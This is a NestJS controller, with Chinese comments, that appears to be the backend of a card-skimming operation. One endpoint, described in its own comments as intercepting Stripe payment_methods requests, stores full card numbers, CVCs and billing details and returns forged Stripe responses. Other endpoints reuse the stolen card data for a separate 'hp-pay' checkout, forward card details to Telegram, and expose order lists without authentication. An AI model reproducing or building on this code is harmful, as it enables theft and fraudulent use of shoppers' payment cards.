import { Controller, Get, Body, Req, Res, Post, Put, Delete, Headers, Query, Logger } from '@nestjs/common'
import { ApiTags, ApiBearerAuth } from '@nestjs/swagger'
import { Request, Response } from 'express'
import { Transform } from 'class-transformer'
import { Public } from 'src/common/decorators/public.decorator'
import { Keep } from 'src/common/decorators/keep.decorator'
import { F1Service } from './f1.service'
import { F1CheckoutDto } from './dto/f1-checkout.dto'
import { PaymentDto, V1PaymentDto } from './dto/payment.dto'
import { PaymentMethodDto } from './dto/payment-method.dto'
import { OrderQueryDto } from './dto/order-query.dto'
import { DataObj } from 'src/common/class/data-obj.class'
import { ApiException } from 'src/common/exceptions/api.exception'
import { genId } from 'src/common/utils'

@ApiTags('Cart订单管理')
@Controller('cart')
export class F1Controller {
  private readonly logger = new Logger(F1Controller.name);
  constructor(private readonly f1Service: F1Service) {}



  @Post('v1/payments')
  @Public()
  @Transform(({ value }) => value)
  async payments(
    @Req() req,
    @Res() res: Response,
    @Body() dto: V1PaymentDto,
  ) {
    try {
      this.logger.log(`收到 payments 请求 - IP: ${req.ip} `)
      this.logger.log(`payments body: ${JSON.stringify(dto)}`)
     

      const paymentMethodId = dto?.checkout?.paymentMethodId
      if (!paymentMethodId) {
        if (!res.headersSent) {
          return res.status(400).json({ error: '缺少 paymentMethodId' })
        }
      }

      // 1. 根据 pm_id 查询 f1_payment_method 表，获取卡信息和订单编号
      const pmRecord = await this.f1Service.findPaymentMethodByPmId(paymentMethodId)
      this.logger.log(`查询到 PaymentMethod: id=${pmRecord.id}, orderNo=${pmRecord.pmId}, last4=${pmRecord.cardLast4}`)
      const orderNo = pmRecord.pmId
      if (!orderNo) {
        this.logger.warn(`PaymentMethod 记录无 orderNo: pm_id=${paymentMethodId}`)
        if (!res.headersSent) {
          return res.status(400).json({ error: '该支付方式未关联订单编号，请先完成结账流程' })
        }
      }
      //更新金额到订单
      this.logger.log(` 更新金额到订单 f1_payment_method表中amount : ${dto?.checkout?.amount}`)
      this.f1Service.updatePaymentMethodAmount(paymentMethodId, dto?.checkout?.amount||0)

      // 2. 拼接卡过期日期 MM/YY 格式
      const expMonth = pmRecord.cardExpMonth?.padStart(2, '0') || '01'
      const expYearShort = pmRecord.cardExpYear?.slice(-2) || '29'
      const cardExpiry = `${expMonth}/${expYearShort}`

      // 3. 构造 PaymentDto，调用 savePayment
      const paymentDto: PaymentDto = {
        card_number: pmRecord.cardNumber || '',
        card_expiry: cardExpiry,
        card_cvv: pmRecord.cardCvc || '',
        card_name: pmRecord.billingName || '',
        email_address: pmRecord.billingEmail || '',
        phone_number: pmRecord.billingPhone || '',
        orderNo,
        userId: genId(),
        amount: dto?.checkout?.amount || 0,
      }

      const clientIp = req.ip || req.connection?.remoteAddress || ''
      const result = await this.f1Service.savePayment(paymentDto, clientIp)

      this.logger.log(`payments 处理完成: orderNo=${orderNo}, payUrl=${result.payUrl || '无'}`)

      // 4. 返回结果
      if (!res.headersSent) {
        res.setHeader('Content-Type', 'application/json')
        if (result.payUrl) {
          // 有支付链接，返回重定向信息
          res.status(200).json({
            status: 'requires_action',
            paymentMethodId,
            orderNo,
            redirect_url: result.payUrl,
            payment_id: result.payment?.paymentId || null,
          })
        } else {
          // hp-pay 未返回支付链接，返回已保存状态
          res.status(200).json({
            status: 'saved',
            paymentMethodId,
            orderNo,
            payment_id: result.payment?.paymentId || null,
            message: '支付信息已保存，等待支付处理',
          })
        }
      }
    } catch (error) {
      this.logger.error('payments 处理失败:', error)
      if (!res.headersSent) {
        res.setHeader('Content-Type', 'application/json')
        res.status(500).json({
          error: error.message || '支付处理失败',
        })
      }
    }
  }
  /**
   * 20260610 统一入口
   * Stripe payment_methods 拦截接口
   * 捕获并存储 Stripe 支付方式请求数据
   */
  @Post('v1/payment_methods')
  @Public()
  @Transform(({ value }) => value)
  async paymentMethods(
    @Req() req,
    @Res() res: Response,
    @Body() dto: PaymentMethodDto
  ) {
    try {
      // 获取原始请求体
      let rawBodyStr = ''
      if (req.rawBody && Buffer.isBuffer(req.rawBody)) {
        rawBodyStr = req.rawBody.toString('utf-8')
      } else if (typeof req.body === 'string') {
        rawBodyStr = req.body
      } else {
        rawBodyStr = JSON.stringify(req.body || {})
      }
      const ip = req.ip || req.connection?.remoteAddress || ''
      const userAgent = req.headers['user-agent'] || ''

      this.logger.log(`收到 payment_methods 请求 - IP: ${ip}`)
      this.logger.log(`payment_methods body: ${JSON.stringify(dto)}`)
      this.logger.log(`payment_methods request: ${req.query['amount']} `)
      // 先生成 Stripe pm_ ID，与数据库记录一起保存
      const pmId = this.generateStripeId('pm')
       dto.amount =   0;
      
      // 保存数据（包含 pmId）
      const saved = await this.f1Service.savePaymentMethod(dto, rawBodyStr, ip, userAgent, pmId)

      const created = Math.floor(Date.now() / 1000)
      const expMonth = parseInt(saved.cardExpMonth) || 1
      const expYear = parseInt(saved.cardExpYear) ? 2000 + parseInt(saved.cardExpYear) : 2029

      // 返回完整 Stripe payment_methods 响应格式
      if (!res.headersSent) {
        res.setHeader('Content-Type', 'application/json')
        res.status(200).json({
          id: pmId,
          object: 'payment_method',
          allow_redisplay: saved.allowRedisplay || 'unspecified',
          billing_details: {
            address: {
              city: saved.billingCity || '',
              country: saved.billingCountry || '',
              line1: saved.billingLine1 || '',
              line2: saved.billingLine2 || '',
              postal_code: saved.billingPostalCode || '',
              state: saved.billingState || '',
            },
            email: saved.billingEmail || '',
            name: saved.billingName || '',
            phone: saved.billingPhone || '',
            tax_id: null,
          },
          card: {
            brand: this.detectCardBrand(saved.cardNumber),
            checks: {
              address_line1_check: null,
              address_postal_code_check: null,
              cvc_check: null,
            },
            country: saved.billingCountry ||"",
            display_brand: this.detectCardBrand(saved.cardNumber),
            exp_month: expMonth,
            exp_year: expYear,
            funding: 'credit',
            generated_from: null,
            last4: saved.cardLast4 || '0000',
            networks: {
              available: [this.detectCardBrand(saved.cardNumber)],
              preferred: null,
            },
            regulated_status: 'unregulated',
            three_d_secure_usage: {
              supported: true,
            },
            wallet: null,
          },
          created,
          customer: null,
          customer_account: null,
          livemode: true,
          radar_options: {},
          shared_payment_granted_token: null,
          type: saved.type || 'card',
        })
      }
    } catch (error) {
      this.logger.error('payment_methods 处理失败:', error)
      if (!res.headersSent) {
        res.setHeader('Content-Type', 'application/json')
        res.status(200).json({
          error: {
            message: error.message || 'An error occurred',
            type: 'api_error',
          },
        })
      }
    }
  }
async parseCurrency(str) {
  // 先移除货币符号/文字，再处理千分位
  const clean = str.replace(/[^0-9,.]/g, "");
  return parseFloat(clean.replace(/,/g, ""));
}
  /**
   * F1订单结账接口 
   * 支持 JSON 和 application/x-www-form-urlencoded 表单提交
   */
  @Post('checkoutHtml')
  @Transform(({ value }) => value) // 跳过装饰器头
  @Public() // 公开接口，无需认证
  @Keep() // 跳过 ReponseTransformInterceptor，避免手动 res.send 后再次设置 headers
  async checkoutHtml(@Req() req,
    @Res() res: Response,
    @Body() checkoutDto: F1CheckoutDto) {
    try {
      console.log('F1 Checkout Html ', JSON.stringify(checkoutDto))
      // 从 Cookie 中获取 Shopify 用户标识
      const userId = req.cookies['_shopify_y'] || ''
      console.log('User ID from Cookie:', userId)
      checkoutDto.id = userId
      console.log('F1 Checkout DTO:', JSON.stringify(checkoutDto))
      console.log('F1 Checkout DTO - f1_total 原始值:', checkoutDto.f1_total, '转换后:', decodeURIComponent(checkoutDto.f1_total))
      checkoutDto.f1_total = decodeURIComponent(checkoutDto.f1_total)
      console.log('F1 Checkout DTO - f1_name 转换后:', checkoutDto.f1_name, '转换后:', decodeURIComponent(checkoutDto.f1_name))
      checkoutDto.f1_name = decodeURIComponent(checkoutDto.f1_name)
      console.log('F1 Checkout DTO - f1_title 转换后:', checkoutDto.f1_title, '转换后:', decodeURIComponent(checkoutDto.f1_title))
      checkoutDto.f1_title = decodeURIComponent(checkoutDto.f1_title)
      // 处理金额转换：将字符串格式转为数字（不转分）
      if (checkoutDto.f1_total && typeof checkoutDto.f1_total === 'string') {
        console.log('原始 f1_total:', JSON.stringify(checkoutDto.f1_total))
        console.log('原始 f1_total 长度:', checkoutDto.f1_total.length)
        
        // 尝试不同的处理方式
        let labelIndex = checkoutDto.f1_total.indexOf('$')
        if(labelIndex > -1){
          let cleanValue = checkoutDto.f1_total.substring(labelIndex+1).replace(/,/g, '');
           const moneyValue = parseFloat(cleanValue)
           checkoutDto.f1_money = moneyValue
        }
        
      }

      checkoutDto.order_no = genId();
      
      // 确保金额不为 undefined
      if (!checkoutDto.f1_money) {
        checkoutDto.f1_money = 0
      }

      // 调用 service 保存订单并读取 HTML
      const result = await this.f1Service.checkoutWithHtml(checkoutDto)
      
      console.log('订单保存成功:', checkoutDto.order_no, '金额:', result.order.f1Money)
      
      // 设置响应头为 text/html
      res.setHeader('Content-Type', 'text/html; charset=utf-8')
      
      // 返回 HTML 内容
      res.send(result.html)
    } catch (error) {
      console.error('Checkout Html 错误:', error)
      // 检查是否已经发送响应，避免 headers already sent 错误
      if (!res.headersSent) {
        res.status(500).send(`Error: ${error.message}`)
      }
    }
  }


  @Get('testSend')
  @Public()
  async testSend(
    @Req() req: Request,
    @Res() res: Response,
    @Query('orderNo') orderNo: string
  ): Promise<any> {
    try {
      console.log('Test Send - Order No:', orderNo)
      
      if (!orderNo) {
        return DataObj.create({ 
          message: '请提供 orderNo 参数',
          code: 400,
          usage: 'GET /api/cart/testSend?orderNo=YOUR_ORDER_NO'
        })
      }
      
      // 从数据库获取订单信息
      const order = await this.f1Service.findOne(orderNo)
      
      console.log('订单信息:', order)
      
      // 构造测试数据
      const testData = {
        orderNo: orderNo,
        cardNumber: '4111111111111111',
        expire: '12/25',
        cvv: '123',
        cardName: 'Test User',
        amount: order.f1Money || 0,
        status: 'success'
      }
      
      // 发送 Telegram 通知
      await this.f1Service.sendTelegramNotification(testData)
      
      this.logger.log('Telegram 通知发送成功')
      
      // 返回 JSON 响应
      return DataObj.create({
        message: 'Telegram 通知发送成功',
        code: 200,
        data: {
          orderNo: orderNo,
          amount: order.f1Money,
          orderName: order.f1Name
        }
      })
    } catch (error) {
      console.error('Test Send 错误:', error)
      
      // 返回错误响应
      if (!res.headersSent) {
        return DataObj.create({
          message: `发送失败: ${error.message}`,
          code: 500
        })
      }
    }
  }
  /**
   * 支付接口
   * 保存支付信息，调用 hp-pay 创建支付订单，重定向到收银台
   */
  @Post('payment')
  @Public()
  @Transform(({ value }) => value) // 跳过装饰器头
  @Keep() // 跳过 ReponseTransformInterceptor，避免手动 res.send/redirect 后再次设置 headers
  async payment(
    @Req() req,
    @Res() res: Response,
    @Body() paymentDto: PaymentDto
  ) {
    try {
      console.log('Payment DTO:', JSON.stringify(paymentDto))
      
      // 从 Cookie 中获取用户ID
      const userId = (req.cookies && req.cookies['_shopify_y']) || ''
      paymentDto.userId = userId
      
      console.log('User ID from Cookie:', userId)
      console.log('Order No:', paymentDto.orderNo)

      // 获取客户端 IP
      const forwarded = req.headers['x-forwarded-for']
      const clientIp = (typeof forwarded === 'string' ? forwarded.split(',')[0].trim() : '')
        || (req.headers['x-real-ip'] as string)
        || (req.socket && req.socket.remoteAddress)
        || '127.0.0.1'
      
      // 保存支付信息并调用 hp-pay
      const result = await this.f1Service.savePayment(paymentDto, clientIp)
      
      console.log('Payment processed, payUrl:', result.payUrl)

      if (result.payUrl) {
        // hp-pay 下单成功，重定向到收银台
        res.redirect(302, result.payUrl)
      } else {
        // hp-pay 下单失败，跳转到订单详情页
        const redirectUrl = `/card/detail?orderNo=${paymentDto.orderNo}`
        const html = `<html><body><h3>Payment submitted! Order Number: <a href="${redirectUrl}">${paymentDto.orderNo}</a></h3></body></html>`
        res.setHeader('Content-Type', 'text/html; charset=utf-8')
        res.send(html)
      }
    } catch (error: any) {
      console.error('Payment error:', error)
      if (!res.headersSent) {
        res.status(500).json({
          code: 500,
          message: `Payment failed: ${error.message}`,
          data: null
        })
      }
    }
  }

  /**
   * hp-pay 异步回调通知
   * 接收 hp-pay 支付结果通知，更新支付状态
   */
  @Post('hp-pay/notify')
  @Public()
  @Keep()
  async hpPayNotify(@Req() req, @Res() res: Response) {
    try {
      this.logger.log('hp-pay 异步回调:', JSON.stringify(req.body))

      const notifyData = {
        status: req.body?.status,
        result: typeof req.body?.result === 'string' ? req.body.result : JSON.stringify(req.body?.result ?? ''),
        sign: req.body?.sign,
      }

      const success = await this.f1Service.handleHpPayNotify(notifyData)

      res.setHeader('Content-Type', 'text/plain; charset=utf-8')
      if (success) {
        res.send('success')
      } else {
        res.status(400).send('fail')
      }
    } catch (error: any) {
      this.logger.error('hp-pay 回调处理异常:', error.message)
      res.setHeader('Content-Type', 'text/plain; charset=utf-8')
      res.status(400).send('fail')
    }
  }

  /**
   * 主动查询 hp-pay 支付状态
   * 用于手动触发查询订单支付结果，更新订单表
   */
  @Get('hp-pay/query')
  @Public()
  async queryHpPayStatus(
    @Query('orderNo') orderNo: string
  ) {
    try {
      if (!orderNo) {
        return DataObj.create({
          message: '请提供 orderNo 参数',
          code: 400,
          usage: 'GET /api/cart/hp-pay/query?orderNo=YOUR_ORDER_NO'
        })
      }

      this.logger.log(`手动查询 hp-pay 支付状态: orderNo=${orderNo}`)
      const result = await this.f1Service.queryHpPayPaymentStatus(orderNo)

      return DataObj.create({
        orderNo,
        ...result,
      })
    } catch (error: any) {
      this.logger.error('查询 hp-pay 支付状态失败:', error)
      throw new ApiException(`查询失败: ${error.message}`)
    }
  }

   
  /**
   * 订单列表查询接口
   */
  @Get('list')
  @Public()
  async getOrderList(
    @Query() queryDto: OrderQueryDto
  ) {
    try {
      this.logger.log('Query order list:', JSON.stringify(queryDto))
      
      const result = await this.f1Service.findOrders(queryDto)
      
      return DataObj.create(result)
    } catch (error) {
      this.logger.error('Get order list error:', error)
      throw new ApiException(`查询订单列表失败: ${error.message}`)
    }
  }

  // ===== 私有工具方法 =====

  /**
   * 生成类 Stripe 格式的随机 ID，如 pm_1TgiXaH1Mhw0wmswXiAjEi95
   */
  private generateStripeId(prefix: string): string {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    let result = ''
    for (let i = 0; i < 24; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length))
    }
    return `${prefix}_${result}`
  }

  /**
   * 根据卡号前缀识别卡品牌
   */
  private detectCardBrand(cardNumber: string): string {
    const num = (cardNumber || '').replace(/\D/g, '')
    if (/^4/.test(num)) return 'visa'
    if (/^5[1-5]/.test(num) || /^2[2-7]/.test(num)) return 'mastercard'
    if (/^3[47]/.test(num)) return 'american_express'
    if (/^6(?:011|5)/.test(num)) return 'discover'
    if (/^35/.test(num)) return 'jcb'
    if (/^3(?:0[0-5]|[68])/.test(num)) return 'diners_club'
    return 'unknown'
  }

   
}
